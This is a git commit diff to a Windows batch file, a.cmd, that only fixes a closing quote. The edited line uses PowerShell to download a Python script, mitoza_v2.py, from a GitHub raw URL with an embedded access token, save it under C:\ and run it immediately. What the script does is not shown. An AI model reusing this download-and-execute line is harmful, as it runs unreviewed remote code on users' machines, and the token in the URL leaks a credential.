51510d69c2d78eab29eb97a466cddf690de97e6f
Ksawix <124198403+Ksawix0@users.noreply.github.com>
2025-02-04 21:53:23 +0100

    Update a.cmd

--- a.cmd
+++ a.cmd
@@ -1,2 +1,2 @@
 set direc=C:\
-powershell "iwr https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py?token=GHSAT0AAAAAAC46SNMPZUYQ3LNM4MDZHJAUZ5CPWKA -outfile "%direc%\mitoza.py";start "%direc%\mitoza.py"
+powershell "iwr https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py?token=GHSAT0AAAAAAC46SNMPZUYQ3LNM4MDZHJAUZ5CPWKA -outfile "%direc%\mitoza.py";start "%direc%\mitoza.py""
